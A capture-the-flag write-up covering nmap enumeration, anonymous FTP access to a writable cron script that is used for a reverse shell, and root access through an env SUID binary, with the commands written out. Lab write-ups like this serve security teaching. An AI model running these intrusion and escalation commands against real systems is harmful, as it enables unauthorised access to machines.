# Hacking Challenge Write-Up Template

## Initial Enumeration

The only initial information provided is an IP address. We begin by conducting an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -v {target_ip}
```

### Scan Results:
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

## SMB Enumeration

![image](https://github.com/user-attachments/assets/3ac52289-3ebd-41d9-952c-aa23652037e8)

![image](https://github.com/user-attachments/assets/5d393185-fb1a-4fcb-84e6-d91eb2bc5c3b)

After downloading both of the photos, no information could be found using stegseek or steghide. Seems to be a dead end.

## FTP enumeration

Logging into the ftp server using anonymous login credentials, there is 1 directory containing 3 files.
```
📂 /
 ├── 📂 scripts
 │   ├── 📄 clean.sh            (-rwxr-xrwx) # A simple cleanup file that writes logs to removed_files.log
 │   ├── 📄 removed_files.log   (-rw-rw-r--) # Log file for removed files
 │   ├── 📄 to_do.txt           (-rw-r--r--) # Note to disable anonymous login since it's unsafe (Understatement of the century)
```

## FTP Exploitation

 Since there is write permissions to the clean.sh file, writing in a simple reverse shell and setting up a listener provides us a way of getting a shell. Because cleanup.sh is automated to run, when starting the listener it may take a moment to catch the shell.
 ![image](https://github.com/user-attachments/assets/b3865e25-347a-45a0-87d2-b8c8d418ce1e)

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```
After the shell has stabilized that first flag can be found in user.txt

## Privilege Escalation

Starting with basic enumeration, I like to check for any sudo commands available and suid permissions.

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
Using https://gtfobins.github.io/ we find that the env suid bit is set. 

```bash
/usr/bin/env /bin/sh -p
```
And with that we've obtained root privileges!

![image](https://github.com/user-attachments/assets/cd85dbd7-7688-41ba-af1a-84f683aa31e2)


### Notes:
- Enhance understanding of GTFObin binary commands.

